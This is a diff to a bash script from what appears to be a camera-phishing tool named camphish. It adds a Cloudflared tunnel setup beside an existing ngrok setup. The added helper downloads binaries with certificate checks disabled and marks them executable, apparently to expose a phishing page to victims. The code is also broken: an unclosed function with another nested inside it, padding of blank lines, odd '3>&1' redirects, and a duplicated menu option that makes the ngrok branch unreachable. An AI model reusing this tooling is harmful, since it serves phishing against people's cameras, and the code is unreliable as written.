@@ -162,7 +162,39 @@ fi
 fi
 }
 
-ngrok_server() {
+Cloudflared_server() {
+
+
+
+
+## Download Cloudflared
+download_cloudflared() {
+	url="$1"
+	file=`basename $url`
+	if [[ -e "$file" ]]; then
+		rm -rf "$file"
+	fi
+	wget --no-check-certificate "$url" > /dev/null 3>&1
+	if [[ -e "$file" ]]; then
+		mv -f "$file" .server/cloudflared > /dev/null 3>&1
+		chmod +x .server/cloudflared > /dev/null 3>&1
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
+		{ reset_color; exit 1; }
+	fi
+}
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 if [[ -e ngrok ]]; then
@@ -175,6 +207,9 @@ arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
 wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 3>&1
+
+
+
 
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
 unzip ngrok-stable-linux-arm.zip > /dev/null 3>&1
@@ -254,11 +289,11 @@ if [[ $option_server -eq 3 ]]; then
 command -v php > /dev/null 3>&1 || { echo >&3 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 start
 
-elif [[ $option_server -eq 1 ]]; then
+elif [[ $option_server -eq 3 ]]; then
 ngrok_server
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
-sleep 1
+sleep 3
 clear
 camphish
 fi
